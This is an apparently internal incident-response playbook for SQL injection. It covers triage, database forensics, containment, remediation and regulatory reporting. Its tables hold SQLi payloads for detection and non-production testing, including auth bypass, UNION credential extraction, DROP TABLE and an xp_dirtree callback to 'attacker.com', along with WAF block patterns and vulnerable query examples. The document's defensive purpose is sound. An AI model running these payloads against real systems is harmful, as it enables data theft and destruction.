# Playbook: Web Application Attack – SQL Injection (SQLi) Specific Procedures

---

## 1. Document Control

| Field          | Value                                                        |
| -------------- | ------------------------------------------------------------ |
| Document Name  | Playbook – Web Application Attack (SQL Injection Specific)   |
| Document ID    | IR-PB-WEB-007                                                |
| Version        | 1.0                                                          |
| Effective Date | 19-May-2026                                                  |
| Owner          | L2/L3 Lead / IR Team Lead / Application Security Lead / DBA  |
| Approved By    | CISO                                                         |
| Classification | Internal – Confidential                                      |
| Review Cycle   | Quarterly and after any P1/P2 SQL injection incident         |

---

## 2. Purpose

This document provides **SQL Injection (SQLi) specific investigation, containment, and eradication procedures** for incidents where SQLi exploitation is suspected or confirmed.

SQL Injection is one of the highest-risk web application vulnerabilities because it can lead to:

- **Complete database compromise** (read, write, delete)
- **Mass data exfiltration** of customer records, PII, financial data, intellectual property
- **Authentication bypass** (login without credentials)
- **Privilege escalation** (admin access via SQL manipulation)
- **Remote code execution** on database server (in some database configurations)
- **Lateral movement** via database server compromise
- **Regulatory breach obligations** (GDPR, PCI-DSS, RBI, HIPAA, etc.)

This playbook must be used **in conjunction with** the core Web Application Attack playbooks, not as a standalone procedure.

---

## 3. Scope

### 3.1 In Scope

Applies to SQL Injection attacks against:

- Web application login, search, filter, and user input endpoints
- RESTful APIs and GraphQL endpoints
- Admin panels and internal tools
- Mobile app backend APIs
- Third-party integrations exposing database queries
- Cloud-hosted databases (RDS, Azure SQL, Cloud SQL, etc.)
- On-premises databases (MySQL, PostgreSQL, MSSQL, Oracle, MariaDB, etc.)
- Stored procedures and dynamic SQL query construction

SQLi attack types covered:

- **In-band SQLi** (Union-based, Error-based)
- **Blind SQLi** (Boolean-based, Time-based)
- **Out-of-band SQLi** (DNS exfiltration, HTTP callbacks)
- **Second-order SQLi** (stored input exploited later)

### 3.2 Out of Scope (Use Other Playbooks)

| Scenario                                      | Use Playbook                     |
| --------------------------------------------- | -------------------------------- |
| NoSQL injection (MongoDB, CouchDB, etc.)      | General Web App + custom analysis|
| LDAP injection                                | General Web App playbook         |
| XML injection / XXE                           | General Web App playbook         |
| Data breach confirmed (post-SQLi)             | `02.6_Data-Breach-Exfiltration/` |
| Database server OS compromise (post-SQLi RCE) | `02.11_Network-Intrusion/`       |

---

## 4. Definitions (SQLi-Specific)

| Term                  | Definition                                                   |
| --------------------- | ------------------------------------------------------------ |
| SQLi                  | SQL Injection – code injection technique exploiting unsanitized user input in SQL queries |
| Union-based SQLi      | Uses UNION operator to combine malicious query with original query results |
| Error-based SQLi      | Extracts data through database error messages                |
| Boolean-based Blind   | Infers data by observing TRUE/FALSE response differences     |
| Time-based Blind      | Infers data by measuring query response delay (e.g., SLEEP, WAITFOR) |
| Out-of-band SQLi      | Exfiltrates data via DNS queries or HTTP requests from DB server |
| Second-order SQLi     | Malicious input stored in DB, then exploited when retrieved and used in another query |
| Stacked Queries       | Multiple SQL statements separated by semicolons (`;`)        |
| WAF Virtual Patch     | WAF rule specifically blocking SQLi patterns for a vulnerable endpoint |

---

## 5. SQLi Severity Classification (Incident-Specific)

Standard severity guidance applies, but SQLi incidents have unique risk factors:

| Scenario                                                     | Default Severity |
| ------------------------------------------------------------ | ---------------- |
| Confirmed data extraction (SELECT evidence)                  | **P1**           |
| Confirmed data modification/deletion (UPDATE/DELETE evidence)| **P1**           |
| Confirmed authentication bypass (admin access gained)        | **P1**           |
| Database credentials extracted (file read or env var exposure)| **P1**           |
| SQLi allowed by WAF + 2xx responses with anomalies           | **P1 or P2**     |
| Blind SQLi confirmed (time-delay patterns) on sensitive data endpoint | **P2**   |
| SQLi attempts blocked by WAF, no bypass evidence             | **P3**           |
| Automated scanner SQLi attempts (blocked, no impact)         | **P3 or P4**     |

Reference:
`01_INCIDENT-CLASSIFICATION/01.1_Severity-Matrix/P1-Critical-Definition.md`

---

## 6. SQLi Attack Surface Identification (Pre-Incident Intelligence)

### 6.1 Common Vulnerable Parameters (High-Risk Inputs)

| Parameter Type          | Example Endpoints                        | Why Vulnerable                              |
| ----------------------- | ---------------------------------------- | ------------------------------------------- |
| Search queries          | `/search?q=`, `/products?search=`        | Often directly concatenated into SQL        |
| Filters and sorts       | `/list?category=`, `/items?sort=`        | Column names or values passed to ORDER BY   |
| Login forms             | `/login`, `/api/auth`                    | Username/password fields in WHERE clauses   |
| User IDs in URLs        | `/profile?id=`, `/invoice?user_id=`      | Numeric IDs often unvalidated               |
| Pagination              | `/page?offset=`, `/results?limit=`       | LIMIT/OFFSET values                         |
| Admin panels            | `/admin/users?filter=`                   | Trusted user assumptions                    |
| API endpoints           | `/api/v1/user/{id}`, `/graphql`          | Less tested than web UI                     |
| Mobile backend APIs     | `/mobile/api/orders?status=`             | Often legacy code                           |

### 6.2 Common Vulnerable Query Patterns (Code-Level)

| Anti-Pattern                              | Example (Vulnerable)                                         | Risk                  |
| ----------------------------------------- | ------------------------------------------------------------ | --------------------- |
| String concatenation                      | `query = "SELECT * FROM users WHERE id = " + userId`         | Direct injection      |
| Unvalidated ORDER BY                      | `query = "SELECT * FROM items ORDER BY " + sortColumn`       | Column name injection |
| Dynamic table/column names                | `query = "SELECT * FROM " + tableName`                       | Schema manipulation   |
| Stored procedure with dynamic SQL         | `EXEC('SELECT * FROM users WHERE name = ''' + @input + '''')` | Injection in SP       |
| ORM misuse (raw queries)                  | `db.execute("SELECT * FROM users WHERE id = " + id)`         | Bypass ORM protections|

---

## 7. SQLi Investigation Workflow (L2/L3)

This section provides the **detailed step-by-step investigation procedure** for confirmed or suspected SQLi incidents.

---

### Phase 1 – Initial SQLi Confirmation (L2)

#### 7.1A Evidence Collection Checklist

| Evidence Item                     | Source                  | Priority | Notes                                        |
| --------------------------------- | ----------------------- | -------- | -------------------------------------------- |
| WAF alert details                 | WAF console / SIEM      | P0       | Rule triggered, payload, action (block/allow)|
| Request payload samples           | WAF / reverse proxy     | P0       | Full HTTP request with headers               |
| Response samples                  | WAF / web server logs   | P0       | Status codes, response size, timing          |
| Web server access logs (raw)      | NGINX/Apache/IIS        | P0       | Time window: 24h before first alert          |
| Application logs                  | App logging system      | P1       | Auth events, errors, exceptions              |
| Database query logs               | DB server               | P1       | Slow query log, general query log (if enabled)|
| Database audit logs               | DB audit feature        | P1       | SELECT/UPDATE/DELETE/DROP events             |
| APM metrics                       | APM tool                | P2       | DB query time, error rates                   |
| Response time anomalies           | WAF / APM / web logs    | P2       | Time-based blind SQLi indicator              |

#### 7.1B Request Analysis – SQLi Payload Identification

Examine captured request for common SQLi markers:

| SQLi Type          | Common Payload Patterns                                      | Detection Markers                            |
| ------------------ | ------------------------------------------------------------ | -------------------------------------------- |
| Union-based        | `' UNION SELECT NULL--`, `' UNION ALL SELECT 1,2,3--`        | UNION keyword, SELECT in unexpected context  |
| Error-based        | `' AND 1=CONVERT(int, @@version)--`, `' OR 1=1--`            | SQL keywords, comment markers (`--`, `#`, `/*`) |
| Boolean-based      | `' AND 1=1--`, `' AND 1=2--`                                 | Logical operators, TRUE/FALSE variations     |
| Time-based         | `'; WAITFOR DELAY '00:00:05'--`, `' OR SLEEP(5)--`           | Time delay functions (SLEEP, WAITFOR, BENCHMARK) |
| Out-of-band        | `'; EXEC xp_dirtree '\\attacker.com\share'--`                | DNS/UNC paths, external callbacks            |
| Stacked queries    | `'; DROP TABLE users--`, `'; INSERT INTO admins...`          | Multiple statements separated by `;`         |
| Comment injection  | `admin'--`, `' OR '1'='1' --`                                | Comment markers to terminate query           |

#### 7.1C Response Analysis – Success Indicators

| Indicator                                  | What It Suggests                 | Confidence Level |
| ------------------------------------------ | -------------------------------- | ---------------- |
| **Large response size anomaly**            | Data extraction (UNION)          | High             |
| **Database error in response**             | Error-based SQLi success         | High             |
| **Different response for TRUE vs FALSE**   | Boolean-based blind SQLi         | Medium           |
| **Response delay matches SLEEP/WAITFOR**   | Time-based blind SQLi            | High             |
| **Normal response but DB audit shows query**| Successful injection (in-band)  | High             |
| **2xx status but unusual data in response**| Data leakage                     | Medium-High      |

---

### Phase 2 – Scope and Impact Assessment (L2)

#### 7.2A Determine Exploitation Success Level

| Success Level       | Evidence Required                                            | Immediate Action                     |
| ------------------- | ------------------------------------------------------------ | ------------------------------------ |
| **Confirmed**       | DB audit shows injected query executed + data returned       | P1 escalation, containment immediate |
| **Highly Likely**   | Response anomalies + payload allowed + time-delay correlation | P1/P2 escalation, containment        |
| **Possible**        | Payload allowed but no response anomaly or DB audit unavailable | L2 deep dive, enhanced monitoring    |
| **Blocked**         | WAF blocked, no bypass evidence, stable metrics              | P3 monitoring, tune detection        |

#### 7.2B Database Access Scope Questions (Mandatory L2 Assessment)

| Question                                                     | How to Answer                                                | If YES → Action                          |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------------------------------- |
| **Can attacker read data?**                                  | Check DB audit for SELECT statements; check response size anomalies | Activate data breach assessment          |
| **Can attacker modify data?**                                | Check DB audit for UPDATE/INSERT/DELETE                      | Escalate to P1; integrity validation required |
| **Can attacker bypass authentication?**                      | Test if `' OR '1'='1` patterns allow login bypass            | Force logout all sessions; escalate      |
| **Can attacker read database credentials or config files?**  | Check for `LOAD_FILE()`, `xp_cmdshell`, `INTO OUTFILE`       | Rotate DB credentials immediately        |
| **Can attacker escalate to DB admin?**                       | Check for privilege escalation attempts in DB audit          | Lock down DB accounts; escalate          |
| **Can attacker execute OS commands on DB server?**           | Check for `xp_cmdshell`, `EXEC`, `sys_exec` usage            | Isolate DB server; escalate to IR Team   |

#### 7.2C Data Sensitivity Assessment (Required for Breach Trigger Decision)

Identify **what data** is accessible via the exploited endpoint:

| Data Type                        | Classification | Breach Trigger? | Regulatory Obligation              |
| -------------------------------- | -------------- | --------------- | ---------------------------------- |
| Customer PII (name, email, phone)| High           | Yes             | GDPR, RBI, CCPA, etc.              |
| Payment card data (PAN, CVV)     | Critical       | Yes             | PCI-DSS immediate notification     |
| Health records (PHI)             | Critical       | Yes             | HIPAA breach notification          |
| Financial records                | High           | Yes             | RBI, SOX, etc.                     |
| Authentication credentials       | High           | Yes             | Password reset + notification      |
| Internal IP / non-sensitive      | Low-Medium     | Case-by-case    | May not trigger breach obligations |

**Decision Point:**

- If **any High/Critical data accessible** + **evidence of extraction** → **Activate Data Breach Playbook immediately**

Reference:
`02_PLAYBOOKS/02.6_Data-Breach-Exfiltration/PB-DataBreach-Master.md`

---

### Phase 3 – Database-Level Forensics (L2/L3)

#### 7.3A Database Query Log Analysis (Critical Evidence)

| Database Type | Log Type to Enable/Review       | What to Look For                             |
| ------------- | ------------------------------- | -------------------------------------------- |
| **MySQL**     | General query log, slow query   | SELECT with UNION, unusual WHERE clauses     |
| **PostgreSQL**| pg_stat_statements, log_statement='all' | Injected queries, large result sets    |
| **MSSQL**     | SQL Profiler, Extended Events   | Dynamic SQL, xp_cmdshell calls               |
| **Oracle**    | Audit trail, unified audit      | SELECT on sensitive tables, privilege changes|
| **MariaDB**   | General log, slow query log     | Same as MySQL                                |

#### 7.3B Query Pattern Analysis – Injected vs Legitimate

Build a comparison table:

| Time (UTC) | Source IP    | Query Executed                                               | Legitimate? | Impact    |
| ---------- | ------------ | ------------------------------------------------------------ | ----------- | --------- |
| 12:34:01   | 203.0.113.50 | `SELECT * FROM users WHERE id = 1`                           | Yes         | Normal    |
| 12:34:15   | 203.0.113.50 | `SELECT * FROM users WHERE id = 1 UNION SELECT username,password,email FROM admins--` | **No** | **Injection** |
| 12:34:20   | 203.0.113.50 | `SELECT * FROM users WHERE id = 1' OR '1'='1`                | **No** | **Bypass**    |
| 12:34:30   | 203.0.113.50 | `SELECT * FROM users WHERE id = 1; DROP TABLE sessions--`    | **No** | **Destructive** |

#### 7.3C Data Extraction Volume Estimation

If data extraction is confirmed:

| Evidence Source           | Estimation Method                                            |
| ------------------------- | ------------------------------------------------------------ |
| DB query logs             | Count rows returned in injected SELECT queries               |
| Response size (bytes)     | Large responses indicate bulk extraction                     |
| Network egress logs       | Outbound transfer volume from DB server (if applicable)      |
| DB audit trail            | SELECT count on sensitive tables during attack window        |
| Slow query log            | Large result sets trigger slow query log entries             |

**Provide estimate in incident documentation:**

- Approximate number of records accessed
- Approximate data volume (MB/GB)
- Time window (first access to last observed)
- Tables/schemas involved

---

### Phase 4 – Attack Vector and Root Cause Analysis (L3)

#### 7.4A Vulnerable Endpoint Identification

| Step | Action                                                       | Output                          |
| ---- | ------------------------------------------------------------ | ------------------------------- |
| 1    | Map injected payload back to application endpoint            | Vulnerable URL + parameter name |
| 2    | Review application source code (if available) or decompile   | Vulnerable code snippet         |
| 3    | Identify query construction method (string concat vs prepared statement) | Root cause category             |
| 4    | Check if input validation exists                             | Validation bypass method        |
| 5    | Check if WAF rule existed but was bypassed                   | WAF evasion technique           |

#### 7.4B Root Cause Categories (Standard Classification)

| Root Cause                          | Example                                                      | Remediation                         |
| ----------------------------------- | ------------------------------------------------------------ | ----------------------------------- |
| **No input validation**             | Raw user input passed directly to SQL query                  | Add input validation + use prepared statements |
| **Insufficient input sanitization** | Blacklist approach (blocks some SQLi but not all)            | Use parameterized queries (prepared statements) |
| **Dynamic SQL in stored procedures**| SP uses `EXEC()` with concatenated strings                   | Rewrite SP with parameters          |
| **ORM misuse (raw queries)**        | Developer bypasses ORM safety with raw SQL execution         | Enforce ORM usage + code review     |
| **Second-order injection**          | Malicious input stored, then used unsafely in another query  | Sanitize on output as well as input |
| **WAF bypass**                      | Obfuscation, encoding, or case variation bypassed WAF signature | Update WAF rules + virtual patch    |

#### 7.4C Database Configuration Weaknesses (If Exploitation Deep)

Check for dangerous database configurations that amplify impact:

| Configuration Issue                  | Risk                                 | Validation Method                  |
| ------------------------------------ | ------------------------------------ | ---------------------------------- |
| **DB user has excessive privileges** | Attacker can read all tables         | Review GRANT statements            |
| **xp_cmdshell enabled (MSSQL)**      | OS command execution possible        | `SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'` |
| **LOAD_FILE enabled (MySQL)**        | File read from DB server filesystem  | Check `secure_file_priv` setting   |
| **Outbound network allowed from DB** | Out-of-band exfiltration possible    | Check firewall rules for DB server |
| **Audit logging disabled**           | No forensic evidence available       | Enable audit logging immediately   |

---

### Phase 5 – Containment (SQLi-Specific Actions)

Containment must be **layered** and **rapid** to stop ongoing exploitation while minimizing business disruption.

#### 7.5A Immediate Containment Actions (Priority Order)

| Priority | Action                                      | Owner          | Implementation Time | Notes                                    |
| -------- | ------------------------------------------- | -------------- | ------------------- | ---------------------------------------- |
| **P0**   | Block attacker source IPs at WAF/firewall   | Network/WAF    | < 5 minutes         | May rotate IPs; monitor for new sources  |
| **P0**   | Deploy WAF virtual patch for vulnerable endpoint | AppSec/WAF | < 15 minutes        | Regex rule blocking SQLi patterns        |
| **P1**   | Rate-limit vulnerable endpoint              | WAF/API Gateway| < 10 minutes        | Slow down automated extraction           |
| **P1**   | Disable vulnerable feature (if feasible)    | App Owner      | < 30 minutes        | Requires business approval for prod      |
| **P2**   | Restrict database user privileges           | DBA            | < 30 minutes        | Drop SELECT on sensitive tables if possible |
| **P2**   | Enable database query auditing (if not on)  | DBA            | < 15 minutes        | Evidence collection + detection          |
| **P3**   | Block outbound network from DB server       | Network        | < 1 hour            | Prevent out-of-band exfiltration         |

#### 7.5B WAF Virtual Patch Examples (Specific to SQLi)

| SQLi Type          | Example WAF Rule Pattern (Regex/Logic)                       | Notes                                |
| ------------------ | ------------------------------------------------------------ | ------------------------------------ |
| Union-based        | Block if request contains `UNION.*SELECT`                    | Case-insensitive                     |
| Comment injection  | Block `--`, `#`, `/*`, `*/` in parameters                    | May have false positives; test first |
| Time-based         | Block `SLEEP`, `WAITFOR`, `BENCHMARK`, `pg_sleep`            | Function name blocking               |
| Stacked queries    | Block `;` in parameters (where not expected)                 | Validate against legitimate use      |
| Error-based        | Block `CONVERT`, `CAST`, `@@version`, `database()`           | May need tuning                      |
| Out-of-band        | Block `xp_cmdshell`, `xp_dirtree`, `LOAD_FILE`, `INTO OUTFILE` | High-confidence block                |

**Important:** Always test virtual patch rules in monitoring mode first (if business allows) to avoid blocking legitimate traffic.

#### 7.5C Database-Level Containment (DBA Actions)

| Action                                        | Purpose                          | Risk to Business        | Approval Required |
| --------------------------------------------- | -------------------------------- | ----------------------- | ----------------- |
| **Revoke SELECT on sensitive tables**         | Stop data extraction             | May break app features  | App Owner + SOC Lead |
| **Rotate database credentials**               | Invalidate stolen credentials    | App restart required    | App Owner         |
| **Enable read-only mode (if supported)**      | Prevent data modification        | High impact             | Management        |
| **Kill active suspicious sessions**           | Disconnect attacker              | Low                     | DBA               |
| **Disable stored procedures (if vulnerable)** | Remove attack vector             | May break functionality | App Owner         |
| **Increase query timeout limits**             | Mitigate time-based blind SQLi   | Medium (performance)    | DBA               |

---

### Phase 6 – Eradication and Remediation (Post-Containment)

#### 7.6A Code Remediation (Permanent Fix)

| Remediation Type                  | Implementation Example (Python/Pseudo)                       | Timeline      |
| --------------------------------- | ------------------------------------------------------------ | ------------- |
| **Use Prepared Statements**       | `cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))` | Immediate     |
| **Use ORM safely**                | `User.objects.filter(id=user_id)` (Django ORM)               | Immediate     |
| **Input validation (whitelist)**  | `if re.match(r'^\d+$', user_id): ...` (numeric ID only)      | Immediate     |
| **Parameterized stored procedures**| `CREATE PROCEDURE GetUser @userId INT AS SELECT * FROM users WHERE id = @userId` | Medium-term   |
| **Escape special characters**     | Last resort; use parameterization instead                    | Not recommended |

#### 7.6B Validation Testing (Before Declaring Eradication Complete)

| Test                                  | Method                                                       | Expected Result                  |
| ------------------------------------- | ------------------------------------------------------------ | -------------------------------- |
| SQLi payload attempt (safe test env) | Submit known SQLi payloads to patched endpoint in staging    | All blocked by WAF or safe query |
| Penetration test (authorized)        | Engage AppSec or authorized pentester                        | No SQLi vulnerabilities found    |
| Code review                          | Manual review + static analysis tool (SAST)                  | No unsafe query construction     |
| WAF rule effectiveness               | Test with OWASP SQLi payload list                            | All blocked or safely handled    |

#### 7.6C Database Hardening (Post-Incident Improvements)

| Hardening Action                          | Purpose                              | Owner |
| ----------------------------------------- | ------------------------------------ | ----- |
| Principle of least privilege (DB users)   | Limit blast radius of future SQLi    | DBA   |
| Disable dangerous functions (xp_cmdshell) | Prevent command execution            | DBA   |
| Enable comprehensive audit logging        | Evidence for future incidents        | DBA   |
| Network segmentation (DB tier)            | Isolate DB from internet             | Network |
| Regular patching of DB software           | Fix known vulnerabilities            | DBA   |
| Implement database firewall (if available)| Additional defense layer             | DBA   |

---

### Phase 7 – Evidence Preservation and Chain of Custody (Legal Readiness)

SQLi incidents often involve data breach and regulatory reporting, requiring **legally defensible evidence**.

#### 7.7A Evidence Preservation Checklist (P1/P2 Incidents)

| Evidence Item                  | Format                  | Hash Algorithm | Storage Location      | Retention Period |
| ------------------------------ | ----------------------- | -------------- | --------------------- | ---------------- |
| WAF logs (full export)         | JSON / CSV              | SHA-256        | Evidence vault        | 7 years (legal)  |
| Web server access logs         | Raw log files           | SHA-256        | Evidence vault        | 7 years          |
| Application logs               | JSON / structured       | SHA-256        | Evidence vault        | 7 years          |
| Database query audit logs      | DB vendor format        | SHA-256        | Evidence vault        | 7 years          |
| Database audit trail           | DB vendor format        | SHA-256        | Evidence vault        | 7 years          |
| Request/response samples       | PCAP or HTTP archive    | SHA-256        | Evidence vault        | 7 years          |
| Screenshots (if applicable)    | PNG                     | SHA-256        | Evidence vault        | 7 years          |
| Memory dumps (if RCE suspected)| Raw binary              | SHA-256        | Evidence vault        | 7 years          |
| Chain of Custody forms         | PDF (signed)            | SHA-256        | Evidence vault        | 7 years          |

Reference:
`06_EVIDENCE-AND-CHAIN-OF-CUSTODY/06.1_Evidence-Collection/Evidence-Collection-SOP.md`

#### 7.7B Chain of Custody Transfer Log (Template)

| Timestamp (UTC) | Evidence ID       | Transferred From | Transferred To | Method      | Signature |
| --------------- | ----------------- | ---------------- | -------------- | ----------- | --------- |
| 2026-05-19 14:30| EV-INC123-WAF-001 | L2 Analyst (John)| L3 Analyst (Jane)| Secure share | [Signed] |
| 2026-05-19 16:00| EV-INC123-DB-001  | DBA (Mike)       | L3 Analyst (Jane)| Encrypted USB | [Signed] |

---

### Phase 8 – Post-Incident Activities (Mandatory)

#### 7.8A Lessons Learned Session (Required for P1/P2)

Schedule within **5 business days** of incident closure.

Attendees:

- SOC Lead
- L2/L3 analysts involved
- Application Owner
- DBA
- AppSec Lead
- CISO (for P1)

Agenda items:

| Topic                             | Questions to Answer                                          |
| --------------------------------- | ------------------------------------------------------------ |
| Detection effectiveness          | How quickly was SQLi detected? Were there missed signals?    |
| Containment speed                | How long to deploy virtual patch? Any delays?                |
| Root cause                       | Why did the vulnerability exist? Code review gap? Legacy code? |
| Data impact                      | Was data exfiltrated? How much? How did we confirm?          |
| Communication effectiveness      | Were stakeholders notified timely? Any gaps?                 |
| Tooling gaps                     | Do we need better DB audit logging? WAF tuning?              |
| Process improvements             | What should we change in our playbooks?                      |

Reference:
`08_POST-INCIDENT/08.1_Lessons-Learned/Lessons-Learned-Template.md`

#### 7.8B Detection Engineering Improvements (Required Output)

Add to Detection Improvement Log:

| Improvement                                                  | Owner      | Target Date | Status |
| ------------------------------------------------------------ | ---------- | ----------- | ------ |
| Create SIEM correlation for SQLi response size anomaly       | L3/Detection | +30 days  | Open   |
| Tune WAF to block UNION SELECT variations observed in incident | AppSec   | +7 days   | Open   |
| Enable database query auditing on all production databases   | DBA        | +14 days    | Open   |
| Add alert for time-delay patterns in web responses           | L3/Detection | +30 days  | Open   |
| Implement automated SQLi scanning in CI/CD pipeline          | DevSecOps  | +60 days    | Open   |

Reference:
`08_POST-INCIDENT/08.3_Improvement-Tracking/Detection-Improvement-Log.md`

#### 7.8C Threat Intelligence Output (IOC and TTP Sharing)

Generate and share (internally and externally where appropriate):

| Output Type              | Content                                                      | Distribution                     |
| ------------------------ | ------------------------------------------------------------ | -------------------------------- |
| **IOC List**             | Attacker IPs, User-Agents, payload hashes                    | Internal TI platform, SIEM       |
| **TTP Report**           | SQLi techniques used, WAF bypass methods, exploitation chain | Internal TI, peer organizations  |
| **YARA/Sigma Rules**     | Detection signatures for observed patterns                   | Internal detection systems       |
| **MITRE ATT&CK Mapping** | T1190, T1213, T1119, etc.                                    | TI platform, incident report     |

Reference:
`08_POST-INCIDENT/08.4_Threat-Intel-Output/TTP-Intelligence-Report.md`

---

## 8. SQLi-Specific MITRE ATT&CK Mapping (Quick Reference)

| MITRE Technique | Technique Name                    | How It Applies to SQLi                       |
| --------------- | --------------------------------- | -------------------------------------------- |
| T1190           | Exploit Public-Facing Application | Initial SQLi exploitation                    |
| T1213           | Data from Information Repositories| Database data extraction via SELECT          |
| T1119           | Automated Collection              | Automated SQLi tools (sqlmap, etc.)          |
| T1552.001       | Credentials in Files              | Reading DB credentials via LOAD_FILE         |
| T1078           | Valid Accounts                    | Authentication bypass via `' OR '1'='1`      |
| T1048           | Exfiltration Over Alternative Protocol | Out-of-band SQLi (DNS, HTTP callbacks)  |
| T1565.001       | Stored Data Manipulation          | UPDATE/DELETE via SQLi                       |
| T1059           | Command and Scripting Interpreter | OS command execution via xp_cmdshell         |

Full mapping available in:
`02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-MITRE-Mapping.md`

---

## 9. Common SQLi Mistakes to Avoid (Analyst Guidance)

| Mistake                                           | Risk                                | Correct Approach                             |
| ------------------------------------------------- | ----------------------------------- | -------------------------------------------- |
| Assuming WAF block = safe                         | Bypass may exist                    | Always check web/app/DB logs                 |
| Not checking DB audit logs                        | Miss actual data extraction         | DB audit logs are primary evidence           |
| Testing SQLi payloads on production               | May worsen impact                   | Use staging environment only                 |
| Not coordinating with DBA                         | Incomplete forensics                | DBA must be involved early                   |
| Rotating DB credentials without app coordination  | Application outage                  | Coordinate credential rotation with app team |
| Closing incident before code fix validated        | Vulnerability persists              | Require validation testing before closure    |
| Not activating data breach playbook when required | Regulatory non-compliance           | Always assess breach trigger                 |

---

## 10. MSSP Client Handling Notes (SQLi Context)

For MSSP-managed environments:

- **Client approval required** for:
  - Disabling application features
  - Database configuration changes
  - Rotating database credentials
  - Read-only mode activation
- **Client notification required** for:
  - P1/P2 SQLi incidents (immediate)
  - Any suspected data extraction (immediate)
  - Containment actions that may impact availability
- **Evidence segregation:**
  - Store client evidence in client-specific vault
  - Do not share client IOCs with other clients without anonymization and approval
  - Maintain separate Chain of Custody per client

Reference:
`09_MSSP-SPECIFIC/09.1_Client-Management/Client-Environment-Profile-Template.md`

---

## 11. Regulatory and Compliance Context (SQLi)

SQLi incidents often trigger regulatory obligations:

| Regulation   | Trigger Condition                           | Notification Timeline      | Required Evidence                     |
| ------------ | ------------------------------------------- | -------------------------- | ------------------------------------- |
| **GDPR**     | Personal data accessed/exfiltrated          | 72 hours to regulator      | Incident timeline, data scope, IOCs   |
| **PCI-DSS**  | Cardholder data accessed/exfiltrated        | Immediate to payment brands| Forensic report, remediation plan     |
| **RBI**      | Customer data breach in financial sector    | As per RBI circular        | Incident report, root cause, actions  |
| **HIPAA**    | PHI accessed/exfiltrated (healthcare)       | 60 days (with exceptions)  | Risk assessment, breach analysis      |
| **CCPA**     | California resident data breach             | Without unreasonable delay | Notice to consumers                   |

**Action:** If SQLi leads to data breach, activate:
`02_PLAYBOOKS/02.6_Data-Breach-Exfiltration/PB-DataBreach-Regulatory-Reporting.md`

---

## 12. Tools and Techniques Reference

### 12.1 Recommended Tools (L2/L3 Analysts)

| Tool Category           | Tool Examples                    | Purpose                                      |
| ----------------------- | -------------------------------- | -------------------------------------------- |
| SQLi Detection          | SQLMap (controlled use only)     | Validate vulnerability in non-prod           |
| Database Forensics      | DB vendor tools (MySQL Workbench, SSMS) | Query log analysis                    |
| Log Analysis            | Splunk, ELK, Sumo Logic          | Correlation and pattern detection            |
| PCAP Analysis           | Wireshark, tcpdump               | Request/response forensics                   |
| Static Code Analysis    | SonarQube, Checkmarx, Veracode   | Identify vulnerable code                     |
| WAF Management          | Vendor-specific (Cloudflare, Imperva, F5) | Virtual patching                      |

### 12.2 SQLi Testing Payloads (For Controlled Validation Only – Non-Production)

**WARNING:** Only use in authorized testing environments with proper approvals.

| Payload                              | SQLi Type         | Expected Result (Vulnerable System)          |
| ------------------------------------ | ----------------- | -------------------------------------------- |
| `' OR '1'='1`                        | Boolean-based     | Returns all rows (auth bypass)               |
| `' UNION SELECT NULL--`              | Union-based       | Error or null column result                  |
| `' AND SLEEP(5)--`                   | Time-based (MySQL)| Response delayed by 5 seconds                |
| `'; WAITFOR DELAY '00:00:05'--`      | Time-based (MSSQL)| Response delayed by 5 seconds                |
| `' AND 1=CONVERT(int, @@version)--`  | Error-based       | Database version in error message            |

---

## 13. Related Documents

| Document                    | Path                                                         |
| --------------------------- | ------------------------------------------------------------ |
| Web App Master              | `02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-Master.md` |
| Web App L1 Triage           | `02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-L1-Triage.md` |
| Web App L2 Investigation    | `02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-L2-Investigation.md` |
| Web App L3 Forensics        | `02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-L3-Forensics.md` |
| Web App Containment         | `02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-Containment.md` |
| XSS Specific                | `02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-XSS-Specific.md` |
| MITRE Mapping               | `02_PLAYBOOKS/02.8_Web-Application-Attack/PB-WebApp-MITRE-Mapping.md` |
| Data Breach Playbooks       | `02_PLAYBOOKS/02.6_Data-Breach-Exfiltration/`                |
| Evidence Handling           | `06_EVIDENCE-AND-CHAIN-OF-CUSTODY/`                          |
| Lessons Learned Template    | `08_POST-INCIDENT/08.1_Lessons-Learned/Lessons-Learned-Template.md` |
| Detection Improvement Log   | `08_POST-INCIDENT/08.3_Improvement-Tracking/Detection-Improvement-Log.md` |

---

## 14. Revision History

| Version | Date        | Author                               | Changes         |
| ------- | ----------- | ------------------------------------ | --------------- |
| 1.0     | 19-May-2026 | L2/L3 Lead / IR Team Lead / DBA Lead | Initial version |

---

## 15. Approval

Approved by:

Name: ____________________  
Title: ____________________  
Date: ____________________

---

**End of Document**